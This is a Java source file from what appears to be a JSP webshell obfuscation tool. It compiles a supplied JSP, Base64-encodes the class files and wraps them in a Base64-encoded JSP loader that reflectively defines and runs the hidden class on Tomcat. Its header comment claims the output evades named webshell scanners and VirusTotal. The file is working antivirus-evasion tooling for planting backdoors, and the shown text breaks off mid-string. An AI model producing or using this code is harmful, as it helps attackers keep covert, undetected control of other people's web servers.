package encode;

import application.RandomString;
import org.apache.jasper.JspC;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class JspEncodeDemo1 {
    String tamplate;
    String key;
    String sourcecode;
    String encode;
    String demotxt;

    public JspEncodeDemo1() {
    }

    public JspEncodeDemo1(String tamplate, String key, String code) {
        this.tamplate = tamplate;
        this.key = key;
        this.sourcecode = code;
    }

    public static String GetDemotxt(){

        return "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-10-16_jspdemo1\n" +
                " * Bypass: 河马在线、河马本地(1.8.2)、D盾(2.1.7)、WEBDIR+、微步(安全)、VT(0红)、\n" +
                " * 适配：tomcat8.0.x、tomcat8.5.x\n" +
                " * java6 <= java版本 <= java8\n" +
                " */";
    }

    public String[] Run() throws Exception {

        if(!sourcecode.isEmpty()){
            try {

                if(this.key.equals("默认随机")){
                    this.key = "x"+RandomString.getRString(8);
                }

                String filename = this.key+".jsp";
                File file1 = new File("./cache/");
                file1.mkdir();
                FileOutputStream fileOutputStream = new FileOutputStream("./cache/"+filename);
                fileOutputStream.write(this.sourcecode.getBytes(StandardCharsets.UTF_8));

                JspC jspc = new JspC();
                jspc.setUriroot("./cache/");
                jspc.setOutputDir("./cache/");
                jspc.setJspFiles(filename);
                jspc.setCompile(true);
                jspc.execute();

                File file2 = new File("./cache/org/apache/jsp/");
                File[] list = file2.listFiles();
                String jspsource = "";
                for (File f : list) {
                    if (f.getName().contains(".class")) {
                        FileInputStream fileInputStream = new FileInputStream(f.getPath());
                        byte[] buffer = new byte[(int) f.length()];
                        fileInputStream.read(buffer);
                        String s = Base64.getEncoder().encodeToString(buffer);
                        String[] split = f.getName().split("\\.");
                        String demo1 = "U3RyaW5nICRjbGFzc25hbWUkID0gIiRjbGFzc2Jhc2U2NCQiO21hcC5wdXQoIiRjbGFzc25hbWUkIiwgJGNsYXNzbmFtZSQpOw==";
                        String base64class = new String(Base64.getDecoder().decode(demo1));
                        base64class = base64class.replace("$classname$",split[0]);
                        base64class = base64class.replace("$classbase64$",s);
                        jspsource +=base64class;
                    }
                }
                //String demo = "PCVAIHBhZ2UgbGFuZ3VhZ2U9ImphdmEiIHBhZ2VFbmNvZGluZz0iVVRGLTgiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLk1hcCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJvcmcuYXBhY2hlLmphc3Blci5zZXJ2bGV0LkpzcFNlcnZsZXQiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5qYXNwZXIucnVudGltZS5IdHRwSnNwQmFzZSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuU3RhbmRhcmRXcmFwcGVyRmFjYWRlIiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuY2F0YWxpbmEuY29yZS5TdGFuZGFyZFdyYXBwZXIiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5sYW5nLnJlZmxlY3QuRmllbGQiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby5JT0V4Y2VwdGlvbiIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuSGFzaE1hcCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC5NZXRob2QiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5sYW5nLnJlZmxlY3QuQWNjZXNzaWJsZU9iamVjdCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJzdW4ubWlzYy5DaGFyYWN0ZXJEZWNvZGVyIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uUHVzaGJhY2tJbnB1dFN0cmVhbSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJzdW4ubWlzYy5DRUZvcm1hdEV4Y2VwdGlvbiIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJzdW4ubWlzYy5DRVN0cmVhbUV4aGF1c3RlZCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLk91dHB1dFN0cmVhbSIgJT4KCjwlIQogICAgcHVibGljIHN0YXRpYyBjbGFzcyBEIGV4dGVuZHMgQ2hhcmFjdGVyRGVjb2RlciB7CiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgZmluYWwgY2hhcltdIHBlbV9hcnJheSA9IG5ldyBjaGFyW117J0EnLCAnQicsICdDJywgJ0QnLCAnRScsICdGJywgJ0cnLCAnSCcsICdJJywgJ0onLCAnSycsICdMJywgJ00nLCAnTicsICdPJywgJ1AnLCAnUScsICdSJywgJ1MnLCAnVCcsICdVJywgJ1YnLCAnVycsICdYJywgJ1knLCAnWicsICdhJywgJ2InLCAnYycsICdkJywgJ2UnLCAnZicsICdnJywgJ2gnLCAnaScsICdqJywgJ2snLCAnbCcsICdtJywgJ24nLCAnbycsICdwJywgJ3EnLCAncicsICdzJywgJ3QnLCAndScsICd2JywgJ3cnLCAneCcsICd5JywgJ3onLCAnMCcsICcxJywgJzInLCAnMycsICc0JywgJzUnLCAnNicsICc3JywgJzgnLCAnOScsICcrJywgJy8nfTsKICAgICAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBieXRlW10gcGVtX2NvbnZlcnRfYXJyYXkgPSBuZXcgYnl0ZVsyNTZdOwogICAgICAgIGJ5dGVbXSBkZWNvZGVfYnVmZmVyID0gbmV3IGJ5dGVbNF07CiAgICAgICAgcHVibGljIEQoKSB7fQogICAgICAgIHByb3RlY3RlZCBpbnQgYnl0ZXNQZXJBdG9tKCkgewogICAgICAgICAgICByZXR1cm4gNDsKICAgICAgICB9CiAgICAgICAgcHJvdGVjdGVkIGludCBieXRlc1BlckxpbmUoKSB7CiAgICAgICAgICAgIHJldHVybiA3MjsKICAgICAgICB9CiAgICAgICAgcHJvdGVjdGVkIHZvaWQgZGVjb2RlQXRvbShQdXNoYmFja0lucHV0U3RyZWFtIHZhcjEsIE91dHB1dFN0cmVhbSB2YXIyLCBpbnQgdmFyMykgdGhyb3dzIElPRXhjZXB0aW9uIHsKICAgICAgICAgICAgYnl0ZSB2YXI1ID0gLTE7CiAgICAgICAgICAgIGJ5dGUgdmFyNiA9IC0xOwogICAgICAgICAgICBieXRlIHZhcjcgPSAtMTsKICAgICAgICAgICAgYnl0ZSB2YXI4ID0gLTE7CiAgICAgICAgICAgIGlmICh2YXIzIDwgMikgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFRm9ybWF0RXhjZXB0aW9uKCJCQVNFNjREZWNvZGVyOiBOb3QgZW5vdWdoIGJ5dGVzIGZvciBhbiBhdG9tLiIpOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaW50IHZhcjQ7CiAgICAgICAgICAgICAgICBkbyB7dmFyNCA9IHZhcjEucmVhZCgpOwogICAgICAgICAgICAgICAgICAgIGlmICh2YXI0ID09IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBDRVN0cmVhbUV4aGF1c3RlZCgpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gd2hpbGUodmFyNCA9PSAxMCB8fCB2YXI0ID09IDEzKTsKICAgICAgICAgICAgICAgIHRoaXMuZGVjb2RlX2J1ZmZlclswXSA9IChieXRlKXZhcjQ7CiAgICAgICAgICAgICAgICB2YXI0ID0gdGhpcy5yZWFkRnVsbHkodmFyMSwgdGhpcy5kZWNvZGVfYnVmZmVyLCAxLCB2YXIzIC0gMSk7CiAgICAgICAgICAgICAgICBpZiAodmFyNCA9PSAtMSkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBDRVN0cmVhbUV4aGF1c3RlZCgpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBpZiAodmFyMyA+IDMgJiYgdGhpcy5kZWNvZGVfYnVmZmVyWzNdID09IDYxKSB7dmFyMyA9IDM7fQogICAgICAgICAgICAgICAgICAgIGlmICh2YXIzID4gMiAmJiB0aGlzLmRlY29kZV9idWZmZXJbMl0gPT0gNjEpIHt2YXIzID0gMjt9CiAgICAgICAgICAgICAgICAgICAgc3dpdGNoKHZhcjMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyOCA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclszXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjcgPSBwZW1fY29udmVydF9hcnJheVt0aGlzLmRlY29kZV9idWZmZXJbMl0gJiAyNTVdOwogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXI2ID0gcGVtX2NvbnZlcnRfYXJyYXlbdGhpcy5kZWNvZGVfYnVmZmVyWzFdICYgMjU1XTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjUgPSBwZW1fY29udmVydF9hcnJheVt0aGlzLmRlY29kZV9idWZmZXJbMF0gJiAyNTVdOwogICAgICAgICAgICAgICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoKHZhcjMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjIud3JpdGUoKGJ5dGUpKHZhcjUgPDwgMiAmIDI1MiB8IHZhcjYgPj4+IDQgJiAzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNSA8PCAyICYgMjUyIHwgdmFyNiA+Pj4gNCAmIDMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNiA8PCA0ICYgMjQwIHwgdmFyNyA+Pj4gMiAmIDE1KSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNSA8PCAyICYgMjUyIHwgdmFyNiA+Pj4gNCAmIDMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNiA8PCA0ICYgMjQwIHwgdmFyNyA+Pj4gMiAmIDE1KSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjIud3JpdGUoKGJ5dGUpKHZhcjcgPDwgNiAmIDE5MiB8IHZhcjggJiA2MykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBzdGF0aWMgewogICAgICAgICAgICBpbnQgdmFyMDsKICAgICAgICAgICAgZm9yKHZhcjAgPSAwOyB2YXIwIDwgMjU1OyArK3ZhcjApIHtwZW1fY29udmVydF9hcnJheVt2YXIwXSA9IC0xO30KICAgICAgICAgICAgZm9yKHZhcjAgPSAwOyB2YXIwIDwgcGVtX2FycmF5Lmxlbmd0aDsgKyt2YXIwKSB7cGVtX2NvbnZlcnRfYXJyYXlbcGVtX2FycmF5W3ZhcjBdXSA9IChieXRlKXZhcjA7fQogICAgICAgIH0KICAgIH0KJT4KCjwlIQogICAgcHVibGljIGNsYXNzIEpzcENsYXNzTG9hZGVyIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewoKICAgICAgICBwdWJsaWMgSnNwQ2xhc3NMb2FkZXIoQ2xhc3NMb2FkZXIgcGFyZW50KSB7CiAgICAgICAgICAgIHN1cGVyKHBhcmVudCk7CiAgICAgICAgfQoKICAgICAgICBwdWJsaWMgQ2xhc3M8Pz4gZmluZENsYXNzKFN0cmluZyBuYW1lKSB7CgogICAgICAgICAgICBNYXA8U3RyaW5nLCBTdHJpbmc+IG1hcCA9IG5ldyBIYXNoTWFwPD4oKTsKCiAgICAgICAgICAgICRiYXNlNjRjb2RlJAogICAgICAgICAgICAKICAgICAgICAgICAgU3RyaW5nW10gc3BsaXQgPSBuYW1lLnNwbGl0KCJcXC4iKTsKICAgICAgICAgICAgYnl0ZVtdIGNsYXNzQnl0ZXMgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY2xhc3NCeXRlcyA9IG5ldyBEKCkuZGVjb2RlQnVmZmVyKG1hcC5nZXQoc3BsaXRbc3BsaXQubGVuZ3RoIC0gMV0pKTsKICAgICAgICAgICAgfSBjYXRjaCAoSU9FeGNlcHRpb24gZSkgewogICAgICAgICAgICAgICAgZS5wcmludFN0YWNrVHJhY2UoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBNZXRob2QgZGVtb2NsYXNzID0gbnVsbDsKICAgICAgICAgICAgQ2xhc3M8Pz4gYUNsYXNzID0gbnVsbDsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGRlbW9jbGFzcyA9IENsYXNzTG9hZGVyLmNsYXNzLmdldERlY2xhcmVkTWV0aG9kKCJkZWZpbmVDbGFzcyIsIFN0cmluZy5jbGFzcywgYnl0ZVtdLmNsYXNzLCBpbnQuY2xhc3MsIGludC5jbGFzcyk7CiAgICAgICAgICAgICAgICBNZXRob2Qgc2V0QWNjZXNzaWJsZSA9IEFjY2Vzc2libGVPYmplY3QuY2xhc3MuZ2V0TWV0aG9kKCJzZXRBY2Nlc3NpYmxlIiwgYm9vbGVhbi5jbGFzcyk7CiAgICAgICAgICAgICAgICBzZXRBY2Nlc3NpYmxlLmludm9rZShkZW1vY2xhc3MsdHJ1ZSk7CiAgICAgICAgICAgICAgICBhQ2xhc3MgPSAoQ2xhc3M8Pz4pZGVtb2NsYXNzLi8qYSovCiAgICAgICAgICAgICAgICAgICAgICAgIGludm9rZSh0aGlzLCBuYW1lLCBjbGFzc0J5dGVzLCAwLCBjbGFzc0J5dGVzLmxlbmd0aCk7CiAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBhQ2xhc3M7CiAgICAgICAgfQogICAgfQolPgoKPCUKICAgIEpzcFNlcnZsZXQganNwU2VydmxldCA9IG5ldyBKc3BTZXJ2bGV0KCk7CiAgICBKc3BDbGFzc0xvYWRlciBqc3BDbGFzc0xvYWRlciA9IG5ldyBKc3BDbGFzc0xvYWRlcihqc3BTZXJ2bGV0LmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSk7CiAgICBIdHRwSnNwQmFzZSBodHRwSnNwQmFzZSA9IChIdHRwSnNwQmFzZSkganNwQ2xhc3NMb2FkZXIuZmluZENsYXNzKCJvcmcuYXBhY2hlLmpzcC4ka2V5JF9qc3AiKS4vKmEqLwogICAgICAgICAgICBuZXdJbnN0YW5jZSgpOwogICAgU3RhbmRhcmRXcmFwcGVyRmFjYWRlIHN0YW5kYXJkV3JhcHBlckZhY2FkZSA9IG5ldyBTdGFuZGFyZFdyYXBwZXJGYWNhZGUobmV3IFN0YW5kYXJkV3JhcHBlcigpKTsKICAgIEZpZWxkIGNvbmZpZzEgPSBzdGFuZGFyZFdyYXBwZXJGYWNhZGUuZ2V0Q2xhc3MoKS5nZXREZWNsYXJlZEZpZWxkKCJjb25maWciKTsKICAgIGNvbmZpZzEuc2V0QWNjZXNzaWJsZSh0cnVlKTsKICAgIGNvbmZpZzEuc2V0KHN0YW5kYXJkV3JhcHBlckZhY2FkZSwgcGFnZUNvbnRleHQuZ2V0U2VydmxldENvbmZpZygpKTsKICAgIEZpZWxkIGNvbnRleHQgPSBzdGFuZGFyZFdyYXBwZXJGYWNhZGUuZ2V0Q2xhc3MoKS5nZXREZWNsYXJlZEZpZWxkKCJjb250ZXh0Iik7CiAgICBjb250ZXh0LnNldEFjY2Vzc2libGUodHJ1ZSk7CiAgICBjb250ZXh0LnNldChzdGFuZGFyZFdyYXBwZXJGYWNhZGUsIHBhZ2VDb250ZXh0LmdldFNlcnZsZXRDb250ZXh0KCkpOwogICAgaHR0cEpzcEJhc2UuaW5pdChzdGFuZGFyZFdyYXBwZXJGYWNhZGUpOwogICAgaHR0cEpzcEJhc2Uuc2VydmljZShyZXF1ZXN0LCByZXNwb25zZSk7CiU+";
                String demo = "PCVAIHBhZ2UgbGFuZ3VhZ2U9ImphdmEiIHBhZ2VFbmNvZGluZz0iVVRGLTgiICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS51dGlsLioiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0IiAlPgo8JUAgcGFnZSBpbXBvcnQ9Im9yZy5hcGFjaGUuamFzcGVyLnJ1bnRpbWUuSHR0cEpzcEJhc2UiICU+CjwlQCBwYWdlIGltcG9ydD0ib3JnLmFwYWNoZS5jYXRhbGluYS5jb3JlLlN0YW5kYXJkV3JhcHBlckZhY2FkZSIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuU3RhbmRhcmRXcmFwcGVyIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uSU9FeGNlcHRpb24iICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby5PdXRwdXRTdHJlYW0iICU+CjwlQCBwYWdlIGltcG9ydD0iamF2YS5pby5QdXNoYmFja0lucHV0U3RyZWFtIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0LkZpZWxkIiAlPgo8JUAgcGFnZSBpbXBvcnQ9ImphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZCIgJT4KPCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmxhbmcucmVmbGVjdC5BY2Nlc3NpYmxlT2JqZWN0IiAlPgo8JUAgcGFnZSBpbXBvcnQ9InN1bi5taXNjLkNoYXJhY3RlckRlY29kZXIiICU+CjwlQCBwYWdlIGltcG9ydD0ic3VuLm1pc2MuQ0VGb3JtYXRFeGNlcHRpb24iICU+CjwlQCBwYWdlIGltcG9ydD0ic3VuLm1pc2MuQ0VTdHJlYW1FeGhhdXN0ZWQiICU+CgoKPCUhCiAgICBwdWJsaWMgc3RhdGljIGNsYXNzIEQgZXh0ZW5kcyBDaGFyYWN0ZXJEZWNvZGVyIHsKICAgICAgICBwcml2YXRlIHN0YXRpYyBmaW5hbCBjaGFyW10gcGVtX2FycmF5ID0gbmV3IGNoYXJbXXsnQScsICdCJywgJ0MnLCAnRCcsICdFJywgJ0YnLCAnRycsICdIJywgJ0knLCAnSicsICdLJywgJ0wnLCAnTScsICdOJywgJ08nLCAnUCcsICdRJywgJ1InLCAnUycsICdUJywgJ1UnLCAnVicsICdXJywgJ1gnLCAnWScsICdaJywgJ2EnLCAnYicsICdjJywgJ2QnLCAnZScsICdmJywgJ2cnLCAnaCcsICdpJywgJ2onLCAnaycsICdsJywgJ20nLCAnbicsICdvJywgJ3AnLCAncScsICdyJywgJ3MnLCAndCcsICd1JywgJ3YnLCAndycsICd4JywgJ3knLCAneicsICcwJywgJzEnLCAnMicsICczJywgJzQnLCAnNScsICc2JywgJzcnLCAnOCcsICc5JywgJysnLCAnLyd9OwogICAgICAgIHByaXZhdGUgc3RhdGljIGZpbmFsIGJ5dGVbXSBwZW1fY29udmVydF9hcnJheSA9IG5ldyBieXRlWzI1Nl07CiAgICAgICAgYnl0ZVtdIGRlY29kZV9idWZmZXIgPSBuZXcgYnl0ZVs0XTsKICAgICAgICBwdWJsaWMgRCgpIHt9CiAgICAgICAgcHJvdGVjdGVkIGludCBieXRlc1BlckF0b20oKSB7CiAgICAgICAgICAgIHJldHVybiA0OwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgaW50IGJ5dGVzUGVyTGluZSgpIHsKICAgICAgICAgICAgcmV0dXJuIDcyOwogICAgICAgIH0KICAgICAgICBwcm90ZWN0ZWQgdm9pZCBkZWNvZGVBdG9tKFB1c2hiYWNrSW5wdXRTdHJlYW0gdmFyMSwgT3V0cHV0U3RyZWFtIHZhcjIsIGludCB2YXIzKSB0aHJvd3MgSU9FeGNlcHRpb24gewogICAgICAgICAgICBieXRlIHZhcjUgPSAtMTsKICAgICAgICAgICAgYnl0ZSB2YXI2ID0gLTE7CiAgICAgICAgICAgIGJ5dGUgdmFyNyA9IC0xOwogICAgICAgICAgICBieXRlIHZhcjggPSAtMTsKICAgICAgICAgICAgaWYgKHZhcjMgPCAyKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgQ0VGb3JtYXRFeGNlcHRpb24oIkJBU0U2NERlY29kZXI6IE5vdCBlbm91Z2ggYnl0ZXMgZm9yIGFuIGF0b20uIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpbnQgdmFyNDsKICAgICAgICAgICAgICAgIGRvIHt2YXI0ID0gdmFyMS5yZWFkKCk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHZhcjQgPT0gLTEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFU3RyZWFtRXhoYXVzdGVkKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSB3aGlsZSh2YXI0ID09IDEwIHx8IHZhcjQgPT0gMTMpOwogICAgICAgICAgICAgICAgdGhpcy5kZWNvZGVfYnVmZmVyWzBdID0gKGJ5dGUpdmFyNDsKICAgICAgICAgICAgICAgIHZhcjQgPSB0aGlzLnJlYWRGdWxseSh2YXIxLCB0aGlzLmRlY29kZV9idWZmZXIsIDEsIHZhcjMgLSAxKTsKICAgICAgICAgICAgICAgIGlmICh2YXI0ID09IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IENFU3RyZWFtRXhoYXVzdGVkKCk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGlmICh2YXIzID4gMyAmJiB0aGlzLmRlY29kZV9idWZmZXJbM10gPT0gNjEpIHt2YXIzID0gMzt9CiAgICAgICAgICAgICAgICAgICAgaWYgKHZhcjMgPiAyICYmIHRoaXMuZGVjb2RlX2J1ZmZlclsyXSA9PSA2MSkge3ZhcjMgPSAyO30KICAgICAgICAgICAgICAgICAgICBzd2l0Y2godmFyMykgewogICAgICAgICAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXI4ID0gcGVtX2NvbnZlcnRfYXJyYXlbdGhpcy5kZWNvZGVfYnVmZmVyWzNdICYgMjU1XTsKICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyNyA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclsyXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhcjYgPSBwZW1fY29udmVydF9hcnJheVt0aGlzLmRlY29kZV9idWZmZXJbMV0gJiAyNTVdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyNSA9IHBlbV9jb252ZXJ0X2FycmF5W3RoaXMuZGVjb2RlX2J1ZmZlclswXSAmIDI1NV07CiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzd2l0Y2godmFyMykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNSA8PCAyICYgMjUyIHwgdmFyNiA+Pj4gNCAmIDMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI1IDw8IDIgJiAyNTIgfCB2YXI2ID4+PiA0ICYgMykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI2IDw8IDQgJiAyNDAgfCB2YXI3ID4+PiAyICYgMTUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI1IDw8IDIgJiAyNTIgfCB2YXI2ID4+PiA0ICYgMykpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIyLndyaXRlKChieXRlKSh2YXI2IDw8IDQgJiAyNDAgfCB2YXI3ID4+PiAyICYgMTUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyMi53cml0ZSgoYnl0ZSkodmFyNyA8PCA2ICYgMTkyIHwgdmFyOCAmIDYzKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHN0YXRpYyB7CiAgICAgICAgICAgIGludCB2YXIwOwogICAgICAgICAgICBmb3IodmFyMCA9IDA7IHZhcjAgPCAyNTU7ICsrdmFyMCkge3BlbV9jb252ZXJ0X2FycmF5W3ZhcjBdID0gLTE7fQogICAgICAgICAgICBmb3IodmFyMCA9IDA7IHZhcjAgPCBwZW1fYXJyYXkubGVuZ3RoOyArK3ZhcjApIHtwZW1fY29udmVydF9hcnJheVtwZW1fYXJyYXlbdmFyMF1dID0gKGJ5dGUpdmFyMDt9CiAgICAgICAgfQogICAgfQolPgoKPCUhCiAgICBwdWJsaWMgY2xhc3MgSnNwQ2xhc3NMb2FkZXIgZXh0ZW5kcyBDbGFzc0xvYWRlciB7CgogICAgICAgIHB1YmxpYyBKc3BDbGFzc0xvYWRlcihDbGFzc0xvYWRlciBwYXJlbnQpIHsKICAgICAgICAgICAgc3VwZXIocGFyZW50KTsKICAgICAgICB9CgogICAgICAgIHB1YmxpYyBDbGFzczw/PiBmaW5kQ2xhc3MoU3RyaW5nIG5hbWUpIHsKCiAgICAgICAgICAgIE1hcDxTdHJpbmcsIFN0cmluZz4gbWFwID0gbmV3IEhhc2hNYXA8PigpOwoKICAgICAgICAgICAgJGJhc2U2NGNvZGUkCiAgICAgICAgICAgIAogICAgICAgICAgICBTdHJpbmdbXSBzcGxpdCA9IG5hbWUuc3BsaXQoIlxcLiIpOwogICAgICAgICAgICBieXRlW10gY2xhc3NCeXRlcyA9IG51bGw7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjbGFzc0J5dGVzID0gbmV3IEQoKS5kZWNvZGVCdWZmZXIobWFwLmdldChzcGxpdFtzcGxpdC5sZW5ndGggLSAxXSkpOwogICAgICAgICAgICB9IGNhdGNoIChJT0V4Y2VwdGlvbiBlKSB7CiAgICAgICAgICAgICAgICBlLnByaW50U3RhY2tUcmFjZSgpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIE1ldGhvZCBkZW1vY2xhc3MgPSBudWxsOwogICAgICAgICAgICBDbGFzczw/PiBhQ2xhc3MgPSBudWxsOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZGVtb2NsYXNzID0gQ2xhc3NMb2FkZXIuY2xhc3MuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgU3RyaW5nLmNsYXNzLCBieXRlW10uY2xhc3MsIGludC5jbGFzcywgaW50LmNsYXNzKTsKICAgICAgICAgICAgICAgIE1ldGhvZCBzZXRBY2Nlc3NpYmxlID0gQWNjZXNzaWJsZU9iamVjdC5jbGFzcy5nZXRNZXRob2QoInNldEFjY2Vzc2libGUiLCBib29sZWFuLmNsYXNzKTsKICAgICAgICAgICAgICAgIHNldEFjY2Vzc2libGUuaW52b2tlKGRlbW9jbGFzcyx0cnVlKTsKICAgICAgICAgICAgICAgIGFDbGFzcyA9IChDbGFzczw/PilkZW1vY2xhc3MuLyphKi8KICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlKHRoaXMsIG5hbWUsIGNsYXNzQnl0ZXMsIDAsIGNsYXNzQnl0ZXMubGVuZ3RoKTsKICAgICAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGFDbGFzczsKICAgICAgICB9CiAgICB9CiU+Cgo8JQogICAgSnNwU2VydmxldCBqc3BTZXJ2bGV0ID0gbmV3IEpzcFNlcnZsZXQoKT